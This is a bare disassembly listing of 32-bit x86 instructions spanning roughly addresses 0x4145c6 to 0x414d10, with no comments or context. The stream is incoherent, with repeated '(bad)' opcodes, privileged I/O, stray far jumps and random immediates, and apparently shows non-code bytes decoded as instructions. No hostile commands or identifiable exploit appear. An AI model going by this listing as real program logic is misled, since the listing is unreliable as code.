  4145c6:	adc    esi,ebp
  4145c8:	arpl   bp,cx
  4145ca:	push   ss
  4145cb:	adc    al,0x50
  4145cd:	mov    edx,0xc4722f16
  4145d2:	icebp  
  4145d3:	and    DWORD PTR [ebx-0x38],esp
  4145d6:	push   es
  4145d7:	xor    DWORD PTR [edi-0x31],eax
  4145da:	popa   
  4145db:	and    BYTE PTR [edi-0x39],bl
  4145de:	push   ecx
  4145df:	aaa    
  4145e0:	add    cl,ch
  4145e2:	push   ecx
  4145e3:	es ja  0x41457f
  4145e6:	inc    esi
  4145e7:	in     eax,0x31
  4145e9:	iret   
  4145ea:	sub    BYTE PTR cs:[ecx+ebp*8+0x71],ch
  4145ef:	es ja  0x41458b
  4145f2:	dec    esi
  4145f3:	inc    edi
  4145f4:	outs   dx,BYTE PTR ds:[esi]
  4145f5:	add    BYTE PTR [eax-0x1b],bh
  4145f8:	push   0x74
  4145fa:	mov    ch,0xf4
  4145fc:	jae    0x414642
  4145fe:	mov    ecx,0xc8005ceb
  414603:	pop    ss
  414604:	add    BYTE PTR [eax],al
  414606:	enter  0x17,0x0
  41460a:	fcom   DWORD PTR [edi]
  41460c:	inc    eax
  41460d:	dec    edx
  41460e:	daa    
  41460f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414610:	loope  0x4145cc
  414612:	lahf   
  414613:	add    DWORD PTR [ebx+0x39c87d],edi
  414619:	imul   edx,DWORD PTR [esi+0x76],0xaba74a3d
  414620:	loope  0x4145dc
  414622:	add    BYTE PTR [eax],al
  414624:	mov    edi,0x887dbb01
  414629:	cmp    DWORD PTR [eax],eax
  41462b:	imul   edx,DWORD PTR [esi+0x76],0xab674a42
  414632:	loope  0x4145ee
  414634:	lahf   
  414635:	add    DWORD PTR [ebx+0x39887d],edi
  41463b:	imul   edx,DWORD PTR [esi],0x58003b76
  414641:	pop    ss
  414642:	and    DWORD PTR [eax],esi
  414644:	call   0x73ed:0x7f53004f
  41464b:	ja     0x4146c6
  41464d:	loope  0x4146af
  41464f:	pop    esp
  414650:	(bad)  
  414651:	clc    
  414652:	pop    esi
  414653:	jb     0x4146d4
  414655:	loop   0x4146c1
  414657:	data16 je 0x4146a5
  41465a:	inc    ebp
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	in     al,0xeb
  41465e:	jno    0x4146ce
  414660:	cmc    
  414661:	loop   0x414682
  414663:	inc    ebp
  414664:	loopne 0x41464c
  414666:	imul   ebp,DWORD PTR [edi-0x46],0xffffffeb
  41466a:	jno    0x4146c8
  41466c:	shl    esp,0x73
  41466f:	xor    DWORD PTR gs:[ecx+0x1a77671d],edx
  414676:	xor    ebp,DWORD PTR [ebx-0x7e]
  414679:	jno    0x4146d1
  41467b:	je     0x4146db
  41467d:	pop    ds
  41467e:	and    al,0x65
  414680:	dec    esp
  414681:	pop    edi
  414682:	add    DWORD PTR [eax],eax
  414684:	xor    DWORD PTR [ebp+0x5f01],ebp
  41468a:	xor    DWORD PTR [edi+0x4],ecx
  41468d:	arpl   WORD PTR [ecx],si
  41468f:	inc    DWORD PTR [ebx]
  414691:	cmp    BYTE PTR [ecx],dh
  414693:	sti    
  414694:	add    esi,DWORD PTR [edi]
  414696:	xor    DWORD PTR [ebx+0x4],edx
  414699:	sub    esi,DWORD PTR [ecx]
  41469b:	adc    al,0x4
  41469d:	bound  esi,QWORD PTR [ecx]
  41469f:	mov    eax,ds:0x10313501
  4146a4:	add    al,0x34
  4146a6:	xor    DWORD PTR [esi+0x4],ecx
  4146a9:	xor    DWORD PTR fs:[ecx+eax*1+0x40c312b],esi
  4146b1:	xor    DWORD PTR [ecx],esi
  4146b3:	mov    eax,0x58313801
  4146b8:	add    DWORD PTR [ecx+0x31],esp
  4146bb:	pop    edi
  4146bc:	add    DWORD PTR [edx],esi
  4146be:	xor    esp,edx
  4146c0:	add    DWORD PTR [eax],esi
  4146c2:	xor    DWORD PTR [ecx+0x1],ebx
  4146c5:	xor    DWORD PTR fs:[edi],ecx
  4146c8:	add    al,0x5f
  4146ca:	xor    edx,edi
  4146cc:	add    esp,DWORD PTR [esi+0x31]
  4146cf:	add    al,BYTE PTR [eax+eax*1]
  4146d2:	xor    DWORD PTR [eax+0x1c],esi
  4146d5:	popa   
  4146d6:	ret    
  4146d7:	pop    ecx
  4146d8:	ss ins DWORD PTR es:[edi],dx
  4146da:	iret   
  4146db:	pop    eax
  4146dc:	push   edx
  4146dd:	push   ebp
  4146de:	cwde   
  4146df:	leave  
  4146e0:	cmp    al,0x6e
  4146e2:	mov    WORD PTR [edi+0x52],ss
  4146e5:	sub    dh,BYTE PTR [ecx]
  4146e7:	shl    DWORD PTR ds:0xd6145b70,1
  4146ed:	loop   0x4146ef
  4146ef:	add    BYTE PTR [esi],cl
  4146f1:	inc    edi
  4146f2:	mov    gs,WORD PTR [ecx]
  4146f4:	jge    0x414717
  4146f6:	mov    BYTE PTR ds:0x27a83892,dh
  4146fc:	test   BYTE PTR [esi],dh
  4146fe:	mov    WORD PTR [edi+0x70],cs
  414701:	sub    DWORD PTR [eax+eiz*1+0x56e72a54],ecx
  414708:	push   esi
  414709:	and    BYTE PTR [esi+edx*2+0x275d2652],al
  414710:	inc    ebx
  414711:	and    eax,0x204e54e7
  414716:	dec    esp
  414717:	push   ebp
  414718:	push   edx
  414719:	es push ebp
  41471b:	daa    
  41471c:	inc    ebx
  41471d:	hlt    
  41471e:	or     ebp,DWORD PTR [eax]
  414720:	or     eax,0x1d354e4c
  414725:	adc    al,0x1a
  414727:	sbb    esp,DWORD PTR ds:0x23271a2f
  41472d:	and    cl,BYTE PTR [esi+esi*1]
  414730:	push   ecx
  414731:	out    dx,eax
  414732:	add    dl,BYTE PTR [eax-0x24]
  414735:	or     DWORD PTR cs:[edi+0x3],edx
  414739:	sub    bh,ah
  41473b:	push   esp
  41473c:	push   cs
  41473d:	and    BYTE PTR [edx*2+0x26f525d2],cl
  414744:	jecxz  0x414739
  414746:	retf   
  414747:	daa    
  414748:	std    
  414749:	inc    ebp
  41474a:	add    al,0x1f
  41474c:	les    ebx,FWORD PTR [edi]
  41474e:	int3   
  41474f:	jecxz  0x414743
  414751:	sub    bl,cl
  414753:	add    BYTE PTR es:[eax],al
  414756:	rcr    BYTE PTR [edi],1
  414758:	(bad)  
  414759:	xor    eax,0x1aba13c6
  41475e:	mov    ebp,0xa3269a2e
  414763:	and    al,ah
  414765:	xor    eax,0xccffef51
  41476a:	inc    DWORD PTR [ebp+0x71]
  41476d:	les    ebx,FWORD PTR [esp+edx*1+0x51]
  414771:	nop
  414772:	inc    esi
  414773:	xor    eax,0x223c8451
  414778:	arpl   WORD PTR [ebx-0x439c09ee],bx
  41477e:	pop    edi
  41477f:	and    esp,DWORD PTR [ebx+0x7b]
  414782:	ror    BYTE PTR [eax+0x55],cl
  414785:	jmp    0xa29d6b59
  41478a:	pop    ss
  41478b:	and    DWORD PTR [ecx-0x7f],esp
  41478e:	adc    esi,DWORD PTR [ecx]
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	jmp    0x44b578fb
  414796:	pop    esp
  414797:	xor    eax,0x26165f72
  41479c:	and    BYTE PTR [ecx+ecx*1],al
  41479f:	cmp    BYTE PTR [ecx+0x2f],dl
  4147a2:	or     DWORD PTR [eax+eax*1+0x25],eax
  4147a6:	dec    esi
  4147a7:	sub    BYTE PTR [ebx+0x31],dh
  4147aa:	push   esi
  4147ab:	push   edx
  4147ac:	push   esp
  4147ad:	sbb    DWORD PTR ds:0x561d6723,ebp
  4147b3:	and    ebp,DWORD PTR [esi]
  4147b5:	and    DWORD PTR [esi],esp
  4147b7:	sub    BYTE PTR [eax],al
  4147b9:	add    BYTE PTR ds:[eax],al
  4147bc:	push   esi
  4147bd:	and    BYTE PTR ss:0xe95f2052,ah
  4147c4:	cs daa 
  4147c6:	adc    BYTE PTR gs:[ebx],dl
  4147c9:	hlt    
  4147ca:	inc    ebx
  4147cb:	or     BYTE PTR [ecx],bl
  4147cd:	cmp    DWORD PTR [eax],eax
  4147cf:	sbb    al,BYTE PTR [edx]
  4147d1:	dec    eax
  4147d2:	fst    QWORD PTR [bx]
  4147d5:	hlt    
  4147d6:	gs into 
  4147d8:	cld    
  4147d9:	sub    al,0x5f
  4147db:	fst    QWORD PTR [edx-0x1d]
  4147de:	call   esp
  4147e0:	adc    esi,DWORD PTR [esi]
  4147e2:	ins    BYTE PTR es:[edi],dx
  4147e3:	add    ch,bh
  4147e5:	adc    ebp,DWORD PTR [eax]
  4147e7:	add    BYTE PTR [ecx+0x10],al
  4147ea:	and    BYTE PTR [eax],al
  4147ec:	retf   
  4147ed:	push   esp
  4147ee:	dec    esi
  4147ef:	push   ebx
  4147f0:	mov    esp,0xc6493d41
  4147f5:	aas    
  4147f6:	add    BYTE PTR [eax-0x36],dl
  4147f9:	fimul  DWORD PTR [eax+0x41]
  4147fc:	mov    edx,0x9655004a
  414801:	fimul  DWORD PTR [ebp+edx*2-0x63]
  414805:	adc    edi,DWORD PTR [edi]
  414807:	dec    eax
  414808:	lea    edx,[eax+0x47]
  41480b:	add    BYTE PTR [esi-0x6ebaadac],cl
  414811:	dec    esp
  414812:	dec    esi
  414813:	add    al,bl
  414815:	imul   DWORD PTR [edx+0x67]
  414818:	popa   
  414819:	imul   BYTE PTR [esi+0x0]
  41481c:	ja     0x414800
  41481e:	add    BYTE PTR fs:[bx+si],al
  414822:	jno    0x41481a
  414824:	pop    edx
  414825:	jne    0x414891
  414827:	hlt    
  414828:	jmp    FWORD PTR [edi-0x7]
  41482b:	loop   0x41489b
  41482d:	ja     0x414826
  41482f:	loope  0x414894
  414831:	pop    edi
  414832:	pop    esi
  414833:	icebp  
  414834:	imul   esi,DWORD PTR [ebp+0x3d],0x10
  414838:	jno    0x4148ad
  41483a:	sub    eax,0x35616de2
  41483f:	in     eax,dx
  414840:	pop    edx
  414841:	jbe    0x41486c
  414843:	hlt    
  414844:	jo     0x4148ab
  414846:	pop    eax
  414847:	icebp  
  414848:	jae    0x4148ba
  41484a:	jb     0x414802
  41484c:	sub    al,0x0
  41484e:	xor    ah,bl
  414850:	jae    0x4148c2
  414852:	mov    ds:0x60002cb6,al
  414857:	fbstp  TBYTE PTR [ebx+0x70]
  41485a:	imul   ebp,DWORD PTR [ebp-0x52ced0d4],0x4d
  414861:	inc    ebp
  414862:	(bad)  
  414863:	push   ebp
  414864:	es ins BYTE PTR es:[edi],dx
  414866:	xchg   esp,eax
  414867:	jno    0x4148ab
  414869:	push   0x6320c6a3
  41486e:	xor    DWORD PTR [ecx+0x56a36842],eax
  414874:	and    BYTE PTR [edi-0x7c],ah
  414877:	add    BYTE PTR [ecx],0x5c
  41487a:	jb     0x414801
  41487c:	das    
  41487d:	ins    DWORD PTR es:[edi],dx
  41487e:	mov    WORD PTR [eax+0x7a7c6c51],cs
  414884:	add    DWORD PTR [ecx+0x0],edx
  414887:	add    BYTE PTR [esi-0x79],bl
  41488a:	xor    eax,0x281b5075
  41488f:	pop    esp
  414890:	jb     0x414827
  414892:	das    
  414893:	ins    DWORD PTR es:[edi],dx
  414894:	inc    esp
  414895:	nop
  414896:	push   ecx
  414897:	ins    BYTE PTR es:[edi],dx
  414898:	inc    esp
  414899:	cmp    al,BYTE PTR [edi+eax*2]
  41489c:	push   edi
  41489d:	cmp    bh,BYTE PTR [eax]
  41489f:	pop    edi
  4148a0:	dec    ebp
  4148a1:	push   ecx
  4148a2:	dec    ebp
  4148a3:	inc    esp
  4148a4:	dec    eax
  4148a5:	cmp    eax,DWORD PTR [esp+ebx*2]
  4148a8:	repz ficomp DWORD PTR [ebx+ebp*2]
  4148ac:	sbb    al,ah
  4148ae:	push   ds
  4148af:	add    ch,bh
  4148b1:	out    dx,al
  4148b2:	sbb    ah,BYTE PTR [ecx+0x9]
  4148b5:	fistp  DWORD PTR [ebx+ebp*2]
  4148b8:	adc    al,0xad
  4148ba:	dec    ebp
  4148bb:	inc    ecx
  4148bc:	push   ss
  4148bd:	or     BYTE PTR ds:0x4dad0e64,bl
  4148c3:	push   edx
  4148c4:	push   es
  4148c5:	or     bl,BYTE PTR [ecx]
  4148c7:	dec    ebx
  4148c8:	aam    0x0
  4148ca:	cmp    BYTE PTR [eax],al
  4148cc:	cli    
  4148cd:	mov    DWORD PTR [eax+0x63],0x6e1d07cd
  4148d4:	xor    DWORD PTR [ecx],ecx
  4148d6:	cmp    DWORD PTR [ebx],ebp
  4148d8:	cld    
  4148d9:	adc    ecx,esp
  4148db:	pop    ds
  4148dc:	shl    BYTE PTR [esi],cl
  4148de:	int    0x3
  4148e0:	fld    QWORD PTR [ebx-0x27]
  4148e3:	push   ds
  4148e4:	iret   
  4148e5:	sub    al,0xbb
  4148e7:	sub    BYTE PTR [eax+0x33ac14],ah
  4148ed:	add    BYTE PTR [esi+0x724fe731],cl
  4148f3:	and    al,0xc0
  4148f5:	and    dh,BYTE PTR [ebp+0x4f]
  4148f8:	mov    bh,0x1c
  4148fa:	nop
  4148fb:	adc    al,0xba
  4148fd:	aaa    
  4148fe:	cs test ax,sp
  414902:	je     0x414944
  414904:	mov    bh,0x3
  414906:	sub    BYTE PTR [ebx],0x93
  414909:	sub    BYTE PTR [eax-0x1a],ah
  41490c:	(bad)  
  41490d:	sbb    eax,0x529b144e
  414912:	push   esi
  414913:	and    BYTE PTR [edx+esi*1+0x1c953831],cl
  41491a:	inc    eax
  41491b:	sub    ecx,DWORD PTR [edx+0x1d]
  41491e:	pop    edx
  41491f:	hlt    
  414920:	sub    esp,DWORD PTR [edi]
  414922:	push   ebp
  414923:	sub    ecx,DWORD PTR [eax+0x4]
  414926:	pop    es
  414927:	cs push ebx
  414929:	xor    al,0x31
  41492b:	inc    ecx
  41492c:	out    0x26,eax
  41492e:	xor    DWORD PTR [eax],esp
  414930:	out    0x37,eax
  414932:	xor    DWORD PTR [ebx],ebp
  414934:	out    0x1d,eax
  414936:	xor    DWORD PTR ds:0x143130e7,ebp
  41493c:	out    0x4f,eax
  41493e:	in     al,dx
  41493f:	daa    
  414940:	push   cs
  414941:	and    bl,dh
  414943:	daa    
  414944:	mov    DWORD PTR [edi+0x4],0xdc1ffd1d
  41494b:	xor    cl,BYTE PTR [ebx]
  41494d:	daa    
  41494e:	jecxz  0x414963
  414950:	sbb    bh,BYTE PTR [edi]
  414952:	add    BYTE PTR [eax],al
  414954:	rdpmc  
  414956:	add    bl,bh
  414958:	adc    DWORD PTR [eax+eax*1],ebp
  41495b:	daa    
  41495c:	add    esi,DWORD PTR [ecx]
  41495e:	jno    0x414931
  414960:	in     al,dx
  414961:	aas    
  414962:	push   eax
  414963:	jmp    0xaf8c8dc4
  414968:	xor    dl,BYTE PTR [edx+0x6c]
  41496b:	enter  0x3158,0x46
  41496f:	mov    ebp,0xd0711462
  414974:	xor    WORD PTR [esi],bp
  414977:	int    0x53
  414979:	and    BYTE PTR [eax],al
  41497b:	popf   
  41497c:	push   ebx
  41497d:	and    esi,DWORD PTR [ecx+edi*4+0x53]
  414981:	and    esi,DWORD PTR [ecx-0x6a]
  414984:	sbb    eax,0x36e96422
  414989:	xor    eax,0x30739571
  41498e:	fs jnp 0x4149a0
  414991:	and    esi,DWORD PTR [ecx-0x17]
  414994:	push   ds
  414995:	xor    eax,0x237f7d71
  41499a:	arpl   WORD PTR [ebx+0x32],di
  41499d:	dec    eax
  41499e:	pop    edi
  41499f:	pop    edx
  4149a0:	or     DWORD PTR [ebp+ebp*2+0x5b],eax
  4149a4:	stc    
  4149a5:	adc    edx,DWORD PTR [ecx+0x46]
  4149a8:	mov    ebp,cr6
  4149ab:	dec    eax
  4149ac:	arpl   WORD PTR [ecx],si
  4149ae:	pop    esp
  4149af:	das    
  4149b0:	push   ecx
  4149b1:	xor    eax,0x31055171
  4149b6:	pop    edi
  4149b7:	inc    edx
  4149b8:	add    BYTE PTR [eax],al
  4149ba:	add    DWORD PTR [edx+0x6c],edx
  4149bd:	dec    eax
  4149be:	pop    ebx
  4149bf:	xor    DWORD PTR [esi+0x1d],eax
  4149c2:	cmp    eax,0x39045138
  4149c7:	and    BYTE PTR [edi+0x7],ah
  4149ca:	dec    esp
  4149cb:	and    eax,DWORD PTR [eax]
  4149cd:	sub    eax,0x5f27f3
  4149d2:	xor    ch,ch
  4149d4:	inc    ebp
  4149d5:	je     0x414a2f
  4149d7:	adc    BYTE PTR [esi],ch
  4149d9:	pop    ax
  4149db:	hlt    
  4149dc:	inc    DWORD PTR [ebp+0x24]
  4149df:	inc    eax
  4149e0:	daa    
  4149e1:	sub    ebx,DWORD PTR [esi]
  4149e3:	push   esp
  4149e4:	outs   dx,BYTE PTR gs:[esi]
  4149e6:	arpl   WORD PTR [edi+ebp*2+0x68],ax
  4149ea:	gs hlt 
  4149ec:	imul   ebx,DWORD PTR [edi+ebp*8+0x47],0x61
  4149f1:	outs   dx,BYTE PTR ds:[esi]
  4149f2:	int3   
  4149f3:	xor    al,0x6b
  4149f5:	ins    DWORD PTR es:[edi],dx
  4149f6:	in     eax,dx
  4149f7:	outs   dx,BYTE PTR ss:[esi]
  4149f9:	fs or  cl,bl
  4149fc:	push   0x46
  4149fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ff:	out    0xff,eax
  414a01:	inc    edx
  414a02:	lahf   
  414a03:	xor    DWORD PTR [esi+0x65],ebp
  414a06:	stos   DWORD PTR es:[edi],eax
  414a07:	dec    ebx
  414a08:	outs   dx,DWORD PTR gs:[esi]
  414a0a:	scas   al,BYTE PTR es:[edi]
  414a0b:	inc    esp
  414a0c:	cs je  0x4149cf
  414a0f:	dec    ebx
  414a10:	add    BYTE PTR [ebx],dh
  414a12:	xchg   esp,eax
  414a13:	jb     0x414a58
  414a15:	push   esp
  414a16:	mov    eax,0x54696f17
  414a1b:	cmp    ch,BYTE PTR [edi+0x2e]
  414a1e:	add    BYTE PTR [eax],al
  414a20:	mov    cl,0x31
  414a22:	add    BYTE PTR gs:[ebx+ecx*4+0x41],ch
  414a27:	sub    eax,0x4fe416
  414a2c:	cld    
  414a2d:	jmp    0x7360:0xd3f57464
  414a34:	add    DWORD PTR [edi],esi
  414a36:	outs   dx,BYTE PTR ds:[esi]
  414a37:	gs pop edx
  414a39:	sbb    BYTE PTR [edi+0x4f],cl
  414a3c:	inc    esi
  414a3d:	in     al,0x52
  414a3f:	inc    ecx
  414a40:	sub    dl,ch
  414a42:	pop    ebx
  414a43:	inc    ebx
  414a44:	sbb    al,0x39
  414a46:	outs   dx,DWORD PTR ds:[esi]
  414a47:	jae    0x414a7e
  414a49:	dec    ebx
  414a4a:	pop    esp
  414a4b:	push   esp
  414a4c:	xor    DWORD PTR [esp+esi*1],esp
  414a4f:	arpl   bp,di
  414a51:	adc    esp,DWORD PTR [esi]
  414a53:	pop    esp
  414a54:	jmp    0x46ce:0x252feb42
  414a5b:	cmp    BYTE PTR [ecx],bl
  414a5d:	pop    eax
  414a5e:	aas    
  414a5f:	ss test esi,0x2c012ed8
  414a66:	inc    ebx
  414a67:	sub    esi,eax
  414a69:	sub    eax,0x2d043745
  414a6e:	in     al,dx
  414a6f:	das    
  414a70:	popa   
  414a71:	das    
  414a72:	inc    esi
  414a73:	xor    ch,BYTE PTR [edi-0x6f]
  414a76:	in     al,dx
  414a77:	inc    ebp
  414a78:	jae    0x414a4a
  414a7a:	inc    ebp
  414a7b:	das    
  414a7c:	inc    edi
  414a7d:	pop    DWORD PTR [ebp+0x30]
  414a80:	ins    DWORD PTR es:[edi],dx
  414a81:	retf   0x6e1c
  414a84:	add    BYTE PTR [eax],al
  414a86:	inc    edx
  414a87:	outs   dx,DWORD PTR ds:[esi]
  414a88:	add    DWORD PTR [ebx-0x70],eax
  414a8b:	scas   al,BYTE PTR es:[edi]
  414a8c:	sub    al,0x46
  414a8e:	pop    ebp
  414a8f:	int    0x1
  414a91:	pop    esp
  414a92:	jg     0x414a2c
  414a94:	sub    eax,0x240f5051
  414a99:	outs   dx,BYTE PTR ds:[esi]
  414a9a:	push   esi
  414a9b:	jge    0x414a74
  414a9d:	ja     0x414aee
  414a9f:	or     eax,0x99432e01
  414aa4:	xor    DWORD PTR [eax],eax
  414aa6:	pop    ebp
  414aa7:	inc    eax
  414aa8:	push   esi
  414aa9:	dec    ebx
  414aaa:	bound  ecx,QWORD PTR [edi+0x52]
  414aad:	sub    eax,0x5f317d0b
  414ab2:	and    ch,dh
  414ab4:	xor    BYTE PTR [ebp+0x23],ch
  414ab7:	loope  0x414a9c
  414ab9:	xor    ah,BYTE PTR [eax+0x17]
  414abc:	cmp    dh,BYTE PTR es:[ecx]
  414abf:	push   eax
  414ac0:	xor    eax,0x23530363
  414ac5:	imul   ecx,DWORD PTR [esp+edx*1],0xffffffe1
  414ac9:	cmp    edx,DWORD PTR ss:[eax*1-0x38fffacf]
  414ad1:	and    al,0xd5
  414ad3:	neg    DWORD PTR [eax]
  414ad5:	and    eax,esp
  414ad7:	push   es
  414ad8:	shl    DWORD PTR [esi],0x1b
  414adb:	adc    al,0xcd
  414add:	add    edi,ebp
  414adf:	fcomp  DWORD PTR [eax]
  414ae1:	cmp    eax,esp
  414ae3:	in     eax,0x14
  414ae5:	fild   DWORD PTR [esi-0x28]
  414ae8:	mov    edx,0x11000053
  414aed:	loop   0x414abc
  414aef:	xor    dh,BYTE PTR [ecx]
  414af1:	fidivr DWORD PTR [edx-0x29fe80ad]
  414af7:	add    esp,DWORD PTR [eax-0x5fdf4505]
  414afd:	inc    edx
  414afe:	mov    edi,0x9a148518
  414b03:	cmp    dh,BYTE PTR [edi-0x18]
  414b06:	xchg   ebp,eax
  414b07:	inc    esp
  414b08:	arpl   di,dx
  414b0a:	ret    0x8c55
  414b0d:	test   BYTE PTR [ebp-0x49179328],0xe3
  414b14:	and    DWORD PTR [edx-0x2a],eax
  414b17:	inc    edi
  414b18:	xor    ch,0x78
  414b1b:	sbb    al,0x61
  414b1d:	or     BYTE PTR [edx+0x3],bh
  414b20:	and    cl,0xac
  414b23:	dec    edi
  414b24:	rcr    DWORD PTR fs:[eax+0x55e66540],cl
  414b2b:	es dec esp
  414b2d:	aas    
  414b2e:	and    eax,0x1a346150
  414b33:	fisub  DWORD PTR [ebp-0x10]
  414b36:	and    al,0x50
  414b38:	add    ebp,esp
  414b3a:	dec    ebx
  414b3b:	ss daa 
  414b3d:	idiv   DWORD PTR [eax]
  414b3f:	xor    eax,0x1cffda31
  414b44:	in     eax,0x33
  414b46:	inc    ecx
  414b47:	ds push esi
  414b49:	add    dh,BYTE PTR [ecx+ebp*8-0x10]
  414b4d:	out    0x4f,eax
  414b4f:	leave  
  414b50:	add    BYTE PTR [eax],al
  414b52:	lock clc 
  414b54:	imul   ecx,DWORD PTR [esi+ecx*4],0xfffffff5
  414b58:	(bad)  
  414b59:	cmp    BYTE PTR [edx],dl
  414b5b:	add    esi,DWORD PTR [ecx-0x2]
  414b5e:	cmp    DWORD PTR [esi],eax
  414b60:	fs jmp 0xffb34063
  414b66:	das    
  414b67:	push   es
  414b68:	dec    esi
  414b69:	or     BYTE PTR [esi],bl
  414b6b:	cmc    
  414b6c:	(bad)  
  414b6d:	mov    ebx,0xb071f505
  414b72:	not    BYTE PTR [ebx]
  414b74:	inc    edi
  414b75:	(bad)  
  414b76:	dec    ebx
  414b77:	or     BYTE PTR [edi-0x38],ah
  414b7a:	fsub   DWORD PTR ds:[esi-0x45]
  414b7e:	aas    
  414b7f:	repz jae 0x414b50
  414b82:	pop    esp
  414b83:	or     DWORD PTR [eax],eax
  414b85:	cdq    
  414b86:	sub    DWORD PTR [esi],eax
  414b88:	je     0x414b29
  414b8a:	push   edi
  414b8b:	std    
  414b8c:	popa   
  414b8d:	mov    WORD PTR [esp+edx*1+0x51],es
  414b91:	test   BYTE PTR [edx+ecx*1],bh
  414b94:	arpl   WORD PTR [ebx-0x7b8ff682],bx
  414b9a:	xor    ah,BYTE PTR [eax+eax*1]
  414b9d:	jmp    0xa886edd4
  414ba2:	xor    bh,dh
  414ba4:	bound  ebx,QWORD PTR [eax+0x16]
  414ba7:	adc    DWORD PTR [ebp-0x63],eax
  414baa:	jmp    0x53302375
  414baf:	mov    ebx,fs
  414bb1:	mov    edx,0xe956dd10
  414bb6:	add    BYTE PTR [eax],al
  414bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bb9:	ds xor edi,edi
  414bbc:	pushf  
  414bbd:	dec    ecx
  414bbe:	add    BYTE PTR cs:[ebx-0x5dd0027d],bl
  414bc5:	adc    cl,BYTE PTR [eax]
  414bc7:	sub    ebx,DWORD PTR [esi-0x70fafeeb]
  414bcd:	pop    ss
  414bce:	(bad)  
  414bcf:	(bad)  
  414bd0:	cmp    ebp,DWORD PTR [ebx]
  414bd2:	data16 je 0x414bf4
  414bd5:	xor    eax,0x4c246572
  414bda:	outs   dx,BYTE PTR gs:[esi]
  414bdc:	cmp    DWORD PTR [edi+0x46],eax
  414bdf:	push   esp
  414be0:	cmp    ah,bl
  414be2:	dec    esi
  414be3:	imul   ebx,DWORD PTR [ecx+esi*1+0x20],0x5d2e394d
  414beb:	addr16 sub eax,0x6748004a
  414bf1:	inc    edi
  414bf2:	je     0x414bf4
  414bf4:	jge    0x414c3d
  414bf6:	popa   
  414bf7:	jb     0x414c11
  414bf9:	in     al,0x5c
  414bfb:	jae    0x414c08
  414bfd:	adc    al,0x50
  414bff:	outs   dx,DWORD PTR ds:[esi]
  414c00:	fidivr DWORD PTR [edi]
  414c02:	add    BYTE PTR [edx-0x13],dl
  414c05:	imul   esi,DWORD PTR es:[ebp+edi*8+0x73],0x41
  414c0b:	imul   ecx,edx,0xd1435c13
  414c11:	cmp    DWORD PTR [ecx+0x72],esp
  414c14:	lods   al,BYTE PTR ds:[esi]
  414c15:	ds pop edi
  414c17:	imul   ebx,eax,0x6d
  414c1a:	popa   
  414c1b:	jne    0x414c1d
  414c1d:	add    BYTE PTR [ebx+0x5b750030],bh
  414c23:	cs jb  0x414c54
  414c26:	stos   DWORD PTR es:[edi],eax
  414c27:	sub    al,0x6e
  414c29:	data16 mov cl,0x34
  414c2c:	add    BYTE PTR [ebx+ecx*2],bh
  414c2f:	cs je  0x414ca6
  414c32:	popa   
  414c33:	arpl   WORD PTR es:[eax],sp
  414c36:	cmp    WORD PTR [ecx+0x65],bp
  414c3a:	xor    DWORD PTR [eax],ebp
  414c3c:	loop   0x414c3d
  414c3e:	push   eax
  414c3f:	jge    0x414c6c
  414c41:	pop    edi
  414c42:	or     eax,0x533b1f50
  414c47:	jge    0x414c9b
  414c49:	ins    DWORD PTR es:[edi],dx
  414c4a:	pop    ss
  414c4b:	push   ecx
  414c4c:	sub    eax,0x47d8035f
  414c51:	push   ecx
  414c52:	or     BYTE PTR [eax],ch
  414c54:	adc    eax,0x301bdd6e
  414c59:	push   0x504817d0
  414c5e:	fmul   QWORD PTR [eax+0x50]
  414c61:	push   edi
  414c62:	std    
  414c63:	sub    DWORD PTR [edi],ebx
  414c65:	jno    0x414c49
  414c67:	and    edx,DWORD PTR ds:0x397cc26e
  414c6d:	ins    DWORD PTR es:[edi],dx
  414c6e:	ret    0x3388
  414c71:	pop    edi
  414c72:	int3   
  414c73:	pop    edi
  414c74:	add    DWORD PTR [ebx-0x3e],edx
  414c77:	push   edi
  414c78:	das    
  414c79:	dec    esi
  414c7a:	nop
  414c7b:	pop    eax
  414c7c:	and    BYTE PTR [eax],al
  414c7e:	sbb    DWORD PTR [edx+esi*1+0x71],0x66a60000
  414c86:	das    
  414c87:	xor    DWORD PTR fs:[ebp-0x487a8dea],ebp
  414c8e:	xor    BYTE PTR [ebx-0x6d],ch
  414c91:	pop    eax
  414c92:	das    
  414c93:	add    BYTE PTR [ebp-0x60],ah
  414c96:	das    
  414c97:	imul   ecx,DWORD PTR [eax-0x7a93db61],0xffffffa4
  414c9e:	xor    DWORD PTR [ebx+0x31],esp
  414ca1:	scas   eax,DWORD PTR es:[edi]
  414ca2:	xor    DWORD PTR [eax+0x77],esi
  414ca5:	mov    cl,0x51
  414ca7:	cs pop ecx
  414ca9:	mov    al,ds:0xb76d0015
  414cae:	push   ss
  414caf:	je     0x414cfd
  414cb1:	or     eax,0x140a6424
  414cb6:	adc    al,BYTE PTR [eax+eiz*2]
  414cb9:	inc    DWORD PTR [eax+esi*1+0x24]
  414cbd:	cmc    
  414cbe:	pop    eax
  414cbf:	and    DWORD PTR ds:0x171e3dd3,eax
  414cc5:	stc    
  414cc6:	dec    ebx
  414cc7:	inc    ebx
  414cc8:	and    al,BYTE PTR [edi+eax*1]
  414ccb:	push   ebx
  414ccc:	sbb    al,0xf6
  414cce:	cmp    ch,BYTE PTR [edi]
  414cd0:	out    0x1,al
  414cd2:	inc    esp
  414cd3:	add    al,0xf7
  414cd5:	out    0x36,eax
  414cd7:	in     al,0x12
  414cd9:	stc    
  414cda:	sbb    DWORD PTR [eax],esi
  414cdc:	(bad)  
  414cdd:	std    
  414cde:	pop    es
  414cdf:	xor    dh,cl
  414ce1:	(bad)  
  414ce2:	cld    
  414ce3:	jecxz  0x414cc6
  414ce5:	clc    
  414ce6:	clc    
  414ce7:	sub    eax,0x1d20000
  414cec:	out    0x3d,eax
  414cee:	in     eax,0xe3
  414cf0:	(bad)  
  414cf1:	pop    ds
  414cf2:	rol    BYTE PTR [edx],cl
  414cf4:	repz sbb al,0xcf
  414cf7:	hlt    
  414cf8:	ficomp DWORD PTR [esp+eax*8]
  414cfb:	std    
  414cfc:	push   es
  414cfd:	xor    DWORD PTR [eax+0x6f03d8f7],esp
  414d03:	call   0xf7d430be
  414d08:	mov    ecx,0xc7fe8e2f
  414d0d:	das    
  414d0e:	xchg   esi,eax
  414d0f:	std    
  414d10:	(bad)
